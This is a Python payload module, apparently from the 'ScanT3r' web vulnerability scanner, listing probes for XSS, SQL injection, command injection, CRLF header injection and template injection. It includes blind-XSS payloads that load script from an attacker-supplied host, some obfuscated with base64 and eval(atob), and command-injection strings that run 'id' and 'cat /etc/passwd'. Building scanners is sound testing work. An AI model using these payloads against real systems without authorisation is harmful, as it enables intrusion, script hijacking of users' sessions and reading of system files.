__name__ = 'ScanT3r'
__author__ = 'Khaled Nassar'
__email__ = 'knassar702@gmail.com'
__version__ = '0.7#Beta'

from base64 import b64encode

class XSS:
    def __init__(self,host=None):
        self.payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src=x OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','<x/oncopy=brrrr>x']
        self.blind = list()
        if host:
            b = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
            self.payloads.append(f'"><script src={host}></script>')
            self.payloads.append(r"javascript:eval('var a=document.createElement(\'script\');a.src=\'{host}\';document.body.appendChild(a)')".format(host=host))
            self.payloads.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
            self.payloads.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
            self.blind.append(f'"><script src={host}></script>')
            self.blind.append(r"javascript:eval('var a=document.createElement(\'script\');a.src=\'{host}\';document.body.appendChild(a)')".format(host=host))
            self.blind.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
            self.blind.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
sqli_payloads=[
    '"',
    "'",
    '/'
    ]



sql_err = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'unkown' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'Fatal error': 'Fatal error',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}
rce_payloads = {
     ';id #':'gid=',
     ';cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
     '|id #':'gid=',
     '|cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
     '''
id #''':'gid=',
     '''
cat /etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
cat${IFS}/etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      ';id':'gid=',
      ';cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '|id':'gid=',
      '|cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
id''':'gid=',
      '''
cat /etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
cat${IFS}/etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin'
      }

crlf_payloads = [
"%0AHeader-Test:BLATRUC","%0A%20Header-Test:BLATRUC","%20%0AHeader-Test:BLATRUC","%23%OAHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC","%3F%0AHeader-Test:BLATRUC","crlf%0AHeader-Test:BLATRUC","crlf%0A%20Header-Test:BLATRUC","crlf%20%0AHeader-Test:BLATRUC","crlf%23%OAHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC","crlf%3F%0AHeader-Test:BLATRUC","%0DHeader-Test:BLATRUC","%0D%20Header-Test:BLATRUC","%20%0DHeader-Test:BLATRUC","%23%0DHeader-Test:BLATRUC","%23%0AHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC","%3F%0DHeader-Test:BLATRUC","crlf%0DHeader-Test:BLATRUC","crlf%0D%20Header-Test:BLATRUC","crlf%20%0DHeader-Test:BLATRUC","crlf%23%0DHeader-Test:BLATRUC","crlf%23%0AHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC","crlf%3F%0DHeader-Test:BLATRUC","%0D%0AHeader-Test:BLATRUC","%0D%0A%20Header-Test:BLATRUC","%20%0D%0AHeader-Test:BLATRUC","%23%0D%0AHeader-Test:BLATRUC","\r\nHeader-Test:BLATRUC"," \r\n Header-Test:BLATRUC","\r\n Header-Test:BLATRUC","%5cr%5cnHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC","%3F%0D%0AHeader-Test:BLATRUC","crlf%0D%0AHeader-Test:BLATRUC","crlf%0D%0A%20Header-Test:BLATRUC","crlf%20%0D%0AHeader-Test:BLATRUC","crlf%23%0D%0AHeader-Test:BLATRUC","crlf\r\nHeader-Test:BLATRUC","crlf%5cr%5cnHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC","crlf%3F%0D%0AHeader-Test:BLATRUC","%0D%0A%09Header-Test:BLATRUC","crlf%0D%0A%09Header-Test:BLATRUC","%250AHeader-Test:BLATRUC","%25250AHeader-Test:BLATRUC","%%0A0AHeader-Test:BLATRUC","%25%30AHeader-Test:BLATRUC","%25%30%61Header-Test:BLATRUC","%u000AHeader-Test:BLATRUC","//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC","/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC","/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
        ]

ssti_payloads = {
    'scan{{6*6}}t3r':'scan36t3r',
    'scan${6*6}t3r':'scan36t3r',
    'scan<% 6*6 %>t3r':'scan36t3r'
    }


def ssrf_parameters():
    f = open('wordlists/ssrf.txt','r').read().splitlines() 
    return f
